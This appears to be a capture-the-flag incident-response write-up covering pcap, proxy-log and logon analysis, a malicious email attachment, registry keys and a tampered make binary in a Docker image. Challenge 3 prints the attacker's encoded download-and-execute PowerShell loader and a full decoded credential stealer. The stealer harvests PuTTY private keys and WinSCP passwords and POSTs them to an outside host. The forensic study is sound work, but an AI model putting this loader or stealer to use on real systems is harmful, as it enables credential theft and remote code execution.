# challenge 0
follow what the discord instructions

# challenge 1:
open pcap and plug the cidr in to wireshark ip.addr={cidr}

victim -> attacker

1. 203.0.113.120 -> 172.22.10.203
2. 192.168.212.45 -> 172.22.10.203
3. 192.168.195.195.32 ->172.22.10.203

# challenge 2

see if the proxy log has the attacker IP we saw before 
```bash
cat proxy.log | grep '172.22.10.203'  
```

```bash
2021-03-16 08:03:21 42 10.58.121.64 200 TCP_MISS 12734 479 GET http tcthy.invalid chairman - - DIRECT 172.22.10.203 application/octet-stream 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko' PROXIED none - 10.58.121.11 SG-HTTP-Service - none -
```

take the time the seen in the log and compare it to the time spans 

```powershell
$logon = Get-Content ./logins.json | ConvertFrom-Json

for ($i = 0; $i -lt $logon.Count; $i++) {
    
    if($logon[$i].EventId -eq 4624){
        $val = $logon | Where-Object {
            (get-date -Date $_.TimeCreated) -gt (get-date -date $logon[$i].TimeCreated) -and
            $_.PayloadData3 -eq  $logon[$i].PayloadData3
        }
        for ($j = 0; $j -lt $val.Count; $j++) {
            
            if ($val[$j].EventId -eq 4634){
                #set 4-hours ahead in response to the proxy.log file being UTC-0400
                $UtcTime = Get-Date -Date "2021-03-16 12:03:21Z"
                $Start = Get-Date -Date $logon[$i].TimeCreated 
                $End = Get-Date -Date $val[$j].TimeCreated
                
                if($UtcTime -gt $start -and $UtcTime -lt $end ){
                    write-host($UTCTime)
                    write-host($Start) 
                    write-host($End)
                    Write-Host("look at " + $logon[$i].PayloadData3)
                }
            }
        }
    }   
```
    
The result is that logon session id (LogonId: 0X30D0E7) is to blame

# Challenge 3

looking at the emails and the attachements message 16 (Message-ID: <161587340000.22130.61141000145085806@oops.net>) has a strange image (see below)

```
--===============2821242667320483337==
Content-Type: image/jpeg
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="sam3.jpg"
MIME-Version: 1.0
```

this image is actually a base64 encode powershell payload that is encoded and to run silently

```powershell
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AdABjAHQAaAB5AC4AaQBuAHYAYQBsAGkAZAAvAGMAaABhAGkAcgBtAGEAbgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADEANwAzAAoACgAkAGQAZQBjACAAPQAgACQAKABmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABiAHkAdABlAHMALgBsAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAKACAAIAAgACAAJABwAHIAZQB2ACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAHAAcgBlAHYACgAgACAAIAAgACQAcAByAGUAdgAKAH0AKQAKAAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjACkAKQAKAA==
```

This encoded portion then is further extracted to 

```powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://tcthy.invalid/chairman')

$prev = [byte] 173

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
```

now that we know that the web server is calling for http://tcthy.invalid/chairman we can look for that in the pcap to see the bytes that are pulled down when that file is downloaded. (ip.addr == 172.22.10.203 look for the http call for chairman)

then by manipulating the powershell exploit to read in the hex and do to bxor operation we can get the plain text of the droplet

```powershell
#Coverts the Hexdump from wireshark
Function Convert-HexToByteArray {

    [cmdletbinding()]

    param(
        [parameter(Mandatory=$true)]
        [String]
        $HexString
    )

    $Bytes = [byte[]]::new($HexString.Length / 2)

    For($i=0; $i -lt $HexString.Length; $i+=2){
        $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
    }

    $Bytes
}

$bytes = Convert-HexToByteArray -HexString (Get-Content ./Droplet.txt)

$prev = [byte] 173

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})


write-host ([System.Text.Encoding]::UTF8.GetString($dec))
```

this creates the following powershell script

```powershell

$global:log = ""

function Write-Log($out) {
  $global:log += $out + "`n"
}

function Invoke-SessionGopher {
  # Value for HKEY_USERS hive
  $HKU = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $HKLM = 2147483650

  $PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"

  
  Write-Log "Digging on $(Hostname)..."

  # Aggregate all user hives in HKEY_USERS into a variable
  $UserHives = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

  # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
  foreach($Hive in $UserHives) {

    # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information. 
    $UserObject = New-Object PSObject

    $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
    $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
    $ArrayOfPPKFiles = New-Object System.Collections.ArrayList

    $objUser = (GetMappedSID)
    $Source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)

    $UserObject | Add-Member -MemberType NoteProperty -Name "Source" -Value $objUser.Value

    # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
    $PuTTYPath = Join-Path $Hive.PSPath "\$PuTTYPathEnding"
    $WinSCPPath = Join-Path $Hive.PSPath "\$WinSCPPathEnding"

    if (Test-Path $WinSCPPath) {

      # Aggregates all saved sessions from that user's WinSCP client
      $AllWinSCPSessions = Get-ChildItem $WinSCPPath

      (ProcessWinSCPLocal $AllWinSCPSessions)

    } # If (Test-Path WinSCPPath)
    
    if (Test-Path $PuTTYPath) {

      # Store .ppk files
      $PPKExtensionFilesINodes = New-Object System.Collections.ArrayList
      
      # Aggregates all saved sessions from that user's PuTTY client
      $AllPuTTYSessions = Get-ChildItem $PuTTYPath

      (ProcessPuTTYLocal $AllPuTTYSessions)
      
      (ProcessPPKFile $PPKExtensionFilesINodes)

    } # If (Test-Path PuTTYPath)

  } # For each Hive in UserHives
    
  Write-Host "Final log:"
  $global:log

} # Invoke-SessionGopher

####################################################################################
####################################################################################
## Registry Querying Helper Functions
####################################################################################
####################################################################################

# Maps the SID from HKEY_USERS to a username through the HKEY_LOCAL_MACHINE hive
function GetMappedSID {

  # If getting SID from remote computer
  if ($iL -or $Target -or $AllDomain) {
    # Get the username for SID we discovered has saved sessions
    $SIDPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
    $Value = "ProfileImagePath"

    return (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM,$SIDPath,$Value @optionalCreds).sValue
  # Else, get local SIDs
  } else {
    # Converts user SID in HKEY_USERS to username
    $SID = (Split-Path $Hive.Name -Leaf)
    $objSID = New-Object System.Security.Principal.SecurityIdentifier("$SID")
    return $objSID.Translate( [System.Security.Principal.NTAccount])
  }

}


####################################################################################
####################################################################################
## File Processing Helper Functions
####################################################################################
####################################################################################

function ProcessThoroughLocal($AllDrives) {
  
  foreach ($Drive in $AllDrives) {
    # If the drive holds a filesystem
    if ($Drive.Provider.Name -eq "FileSystem") {
      $Dirs = Get-ChildItem $Drive.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$PPKExtensionFilesINodes.Add($Dir)}
          ".rdp" {[void]$RDPExtensionFilesINodes.Add($Dir)}
          ".sdtid" {[void]$sdtidExtensionFilesINodes.Add($Dir)}
        }
      }
    }
  }

}


function ProcessPuTTYLocal($AllPuTTYSessions) {
  
  # For each PuTTY saved session, extract the information we want 
  foreach($Session in $AllPuTTYSessions) {

    $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname,Keyfile

    $PuTTYSessionObject.Source = $Source
    $PuTTYSessionObject.Session = (Split-Path $Session -Leaf)
    $PuTTYSessionObject.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $PuTTYSessionObject.Keyfile = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "PublicKeyFile" -ErrorAction SilentlyContinue).PublicKeyFile)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)
    
    # Grab keyfile inode and add it to the array if it's a ppk
    $Dirs = Get-ChildItem $PuTTYSessionObject.Keyfile -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$PPKExtensionFilesINodes.Add($Dir)}
        }
      }
  }

  if ($o) {
    $ArrayOfPuTTYSessions | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Log "PuTTY Sessions"
    Write-Log ($ArrayOfPuTTYSessions | Format-List | Out-String)
  }

  # Add the array of PuTTY session objects to UserObject
  $UserObject | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $ArrayOfPuTTYSessions

} # ProcessPuTTYLocal

function ProcessWinSCPLocal($AllWinSCPSessions) {
  
  # For each WinSCP saved session, extract the information we want
  foreach($Session in $AllWinSCPSessions) {

    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $Session

    $WinSCPSessionObject = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $WinSCPSessionObject.Source = $Source
    $WinSCPSessionObject.Session = (Split-Path $Session -Leaf)
    $WinSCPSessionObject.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $WinSCPSessionObject.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $WinSCPSessionObject.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($WinSCPSessionObject.Password) {
      $MasterPassUsed = ((Get-ItemProperty -Path (Join-Path $Hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)

      # If the user is not using a master password, we can crack it:
      if (!$MasterPassUsed) {
          $WinSCPSessionObject.Password = (DecryptWinSCPPassword $WinSCPSessionObject.Hostname $WinSCPSessionObject.Username $WinSCPSessionObject.Password)
      # Else, the user is using a master password. We can't retrieve plaintext credentials for it.
      } else {
          $WinSCPSessionObject.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$ArrayOfWinSCPSessions.Add($WinSCPSessionObject)

  } # For each Session in AllWinSCPSessions

  if ($o) {
    $ArrayOfWinSCPSessions | Export-CSV -Append -Path ($OutputDirectory + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Log "WinSCP Sessions"
    Write-Log ($ArrayOfWinSCPSessions | Format-List | Out-String)
  }

  # Add the array of WinSCP session objects to the target user object
  $UserObject | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $ArrayOfWinSCPSessions

} # ProcessWinSCPLocal


function ProcessPPKFile($PPKExtensionFilesINodes) {

  # Extracting the filepath from the i-node information stored in PPKExtensionFilesINodes
  foreach ($Path in $PPKExtensionFilesINodes.VersionInfo.FileName) {

    # Private Key Encryption property identifies whether the private key in this file is encrypted or if it can be used as is
    $PPKFileObject = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $PPKFileObject."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .ppk file into our object
    $PPKFileObject."Path" = $Path

    $PPKFileObject."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $PPKFileObject."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $PPKFileObject."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $NumberOfPrivateKeyLines = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $PPKFileObject."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$NumberOfPrivateKeyLines).Context.PostContext -Join "" } catch {}
    $PPKFileObject."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}

    # Add the object we just created to the array of .ppk file objects
    [void]$ArrayOfPPKFiles.Add($PPKFileObject)

  }

  if ($ArrayOfPPKFiles.count -gt 0) {

    $UserObject | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $ArrayOfPPKFiles

    if ($o) {
      $ArrayOfPPKFiles | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Log "PuTTY Private Key Files (.ppk)"
      Write-Log ($ArrayOfPPKFiles | Select-Object * | Format-List | Out-String)
    }

  }

} # Process PPK File


####################################################################################
####################################################################################
## WinSCP Deobfuscation Helper Functions
####################################################################################
####################################################################################

function DecryptNextCharacterWinSCP($remainingPass) {

  # Creates an object with flag and remainingPass properties
  $flagAndPass = "" | Select-Object -Property flag,remainingPass

  # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
  $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
  $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])

  $Added = $firstval + $secondval

  $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256

  $flagAndPass.flag = $decryptedResult
  $flagAndPass.remainingPass = $remainingPass.Substring(2)

  return $flagAndPass

}

function DecryptWinSCPPassword($SessionHostname, $SessionUsername, $Password) {

  $CheckFlag = 255
  $Magic = 163

  $len = 0
  $key =  $SessionHostname + $SessionUsername
  $values = DecryptNextCharacterWinSCP($Password)

  $storedFlag = $values.flag 

  if ($values.flag -eq $CheckFlag) {
    $values.remainingPass = $values.remainingPass.Substring(2)
    $values = DecryptNextCharacterWinSCP($values.remainingPass)
  }

  $len = $values.flag

  $values = DecryptNextCharacterWinSCP($values.remainingPass)
  $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))

  $finalOutput = ""
  for ($i=0; $i -lt $len; $i++) {
    $values = (DecryptNextCharacterWinSCP($values.remainingPass))
    $finalOutput += [char]$values.flag
  }

  if ($storedFlag -eq $CheckFlag) {
    return $finalOutput.Substring($key.length)
  }

  return $finalOutput

}


Invoke-SessionGopher

Start-Sleep 86400

Invoke-WebRequest -uri http://vrqgb.invalid:8080 -Method Post -Body $global:log
```

The last like gives use the domain the POST request calls to (vrqgb.invalid)

# challenge 4

NTUSER.DAT info

Domain: cbc.net
DC: \\CBC-PDC.cbc.net

The following users and computer combos where found in the registry

* rktbot100@dkr_prd12
* builder04@dkr_prd24
* tester_08@dkr_tst13
* builder02@dkr_prd20
* builder05@dkr_prd38 -no encryption

keys but no entry

* dkr_tst22 -no encryption
* dkr_tst64 -no encryption
* dkr_tst67 -no encryption
* dkr_tst95 -no encryption

The attackers have access to builder05@dkr_prd38. This is beacuse the file existed in NTUSER.dat and there is no encrytion which means there is no password needed to use the key (https://tartarus.org/~simon/putty-snapshots/htmldoc/AppendixC.html)

# challenge 5

looking at the data in the docker image file given the maintainer information is stored in the JSON file

```json
{
    "id": "8c5e81d56d3d10a31fb3b9284ae04f0062348e999aefac685a625ede55587308",
    "parent": "536ccc4b5d999ea5fd06cad9b0c8b3ea822d84cf379bc286d9697ddd8ff7c9e7",
    "created": "2021-07-22T16:11:31.01858837Z",
    "container": "035d0130945e1eb01f5fb032846a934e1b169463843fe3dae4a726f08471b05c",
    "container_config": {
        "Hostname": "035d0130945e",
        "Domainname": "",
        "User": "",
        "AttachStdin": false,
        "AttachStdout": false,
        "AttachStderr": false,
        "Tty": false,
        "OpenStdin": false,
        "StdinOnce": false,
        "Env": [
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        ],
        "Cmd": [
            "/bin/sh",
            "-c",
            "#(nop) ",
            "LABEL docker.cmd.build=docker build --no-cache=true --build-arg BUILD_DATE=$(date -u +'%Y-%m-%dT%H:%M:%SZ') --build-arg VCS_REF=$(git log -n 1 --abbrev-commit --pretty='%H') ."
        ],
        "Image": "sha256:f14bbe4faac87ce363db86b397a4afcb1ac785b80caf87eb7c696881208cb0a4",
        "Volumes": null,
        "WorkingDir": "/usr/local/src",
        "Entrypoint": null,
        "OnBuild": null,
        "Labels": {
            "docker.cmd.build": "docker build --no-cache=true --build-arg BUILD_DATE=$(date -u +'%Y-%m-%dT%H:%M:%SZ') --build-arg VCS_REF=$(git log -n 1 --abbrev-commit --pretty='%H') .",
            "maintainer": "hernandez.charles@panic.invalid",
            "org.opencontainers.image.author": "Charles Hernandez",
            "org.opencontainers.image.created": "2021-03-28T12:06:39Z",
            "org.opencontainers.image.description": "Build and tests container for PANIC. Runs nightly.",
            "org.opencontainers.image.revision": "be3d94bc8340cc6db649f0339b7be4abbf2539da",
            "org.opencontainers.image.title": "PANIC Nightly Build and Test"
        }
    },
    "docker_version": "20.10.6",
    "config": {
        "Hostname": "",
        "Domainname": "",
        "User": "",
        "AttachStdin": false,
        "AttachStdout": false,
        "AttachStderr": false,
        "Tty": false,
        "OpenStdin": false,
        "StdinOnce": false,
        "Env": [
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        ],
        "Cmd": ["./build_test.sh"],
        "Image": "sha256:f14bbe4faac87ce363db86b397a4afcb1ac785b80caf87eb7c696881208cb0a4",
        "Volumes": null,
        "WorkingDir": "/usr/local/src",
        "Entrypoint": null,
        "OnBuild": null,
        "Labels": {
            "docker.cmd.build": "docker build --no-cache=true --build-arg BUILD_DATE=$(date -u +'%Y-%m-%dT%H:%M:%SZ') --build-arg VCS_REF=$(git log -n 1 --abbrev-commit --pretty='%H') .",
            "maintainer": "hernandez.charles@panic.invalid",
            "org.opencontainers.image.author": "Charles Hernandez",
            "org.opencontainers.image.created": "2021-03-28T12:06:39Z",
            "org.opencontainers.image.description": "Build and tests container for PANIC. Runs nightly.",
            "org.opencontainers.image.revision": "be3d94bc8340cc6db649f0339b7be4abbf2539da",
            "org.opencontainers.image.title": "PANIC Nightly Build and Test"
        }
    },
    "architecture": "amd64",
    "os": "linux"
}
```

the docker component added by PANIC is call build_test.sh (see below)

```bash
#!/bin/bash

git clone https://git-svr-69.prod.panic.invalid/hydraSquirrel/hydraSquirrel.git repo

cd /usr/local/src/repo

./autogen.sh

make -j 4 install

make check
```

looking at the run scripts and configuartions nothing looks too out of the place.
this lead to me looking at the path to see if there was a path hijack

```bash
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

in looking at the files i noticed that the make file had a method called gitGrabber() making the file suspect.

it was placed in the f7cca439f519c3fad85e9fe65db17b4a8a7692a39888dadb8d085184e4fde89b layer @ /usr/bin/make

# challenge 6

ip_nounce:
4CE7C75407068E18AABC419C7C0601BF2ED250D6A7683BBA00
ip_ciphertext
BC6FC607F16EA04BACBEDB7DDF6298755E8D07A54100

send data to _ip_:6666


break points: 
0016039b